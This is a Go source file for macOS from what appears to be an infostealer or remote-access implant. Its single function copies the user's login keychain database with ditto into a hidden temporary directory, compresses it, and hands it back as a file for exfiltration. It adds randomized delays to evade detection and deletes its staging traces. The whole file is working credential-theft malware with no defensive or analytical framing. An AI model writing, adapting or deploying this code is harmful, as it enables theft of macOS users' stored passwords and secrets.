//go:build darwin
// +build darwin

package auto

import (
	"bytes"
	"fix-project/mods/config"
	"fix-project/mods/util"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

// AutoModeKeychainDump stages ~/Library/Keychains/login.keychain-db via /usr/bin/ditto
// (TaskApp-style: ditto preserves metadata and can read files locked by other
// processes) into a private /tmp staging dir, packs it with util.Compress and
// exfiltrates the tar.gz as a file. Randomized sub-second sleep before touching
// the keychain (anti rate-heuristic), staging dir removed afterwards.
func AutoModeKeychainDump() (string, [][]byte) {

	// anti rate-limit heuristic jitter, like the TaskApp payload
	time.Sleep(time.Duration(200+rand.Intn(700)) * time.Millisecond)

	home, err := os.UserHomeDir()
	if err != nil {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: no home dir"),
		}
	}

	src := filepath.Join(home, "Library", "Keychains", "login.keychain-db")
	if _, err := os.Stat(src); err != nil {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: no login.keychain-db"),
		}
	}

	stage_dir, err := os.MkdirTemp("", ".uws")
	if err != nil {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: staging unavailable"),
		}
	}
	defer os.RemoveAll(stage_dir)

	dst := filepath.Join(stage_dir, "login.keychain-db")
	cmd := exec.Command("/usr/bin/ditto", src, dst)
	if err := cmd.Run(); err != nil {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: ditto copy failed"),
		}
	}

	var buf bytes.Buffer
	if err := util.Compress(&buf, []string{dst}, false); err != nil || buf.Len() < 512 {
		return config.MSG_LOG, [][]byte{
			[]byte(config.LOG_SUCCESS),
			[]byte("nothing found: keychain unreadable"),
		}
	}

	return config.MSG_FILE, [][]byte{
		[]byte(config.LOG_SUCCESS),
		[]byte("keychain.tar.gz"),
		buf.Bytes(),
	}
}
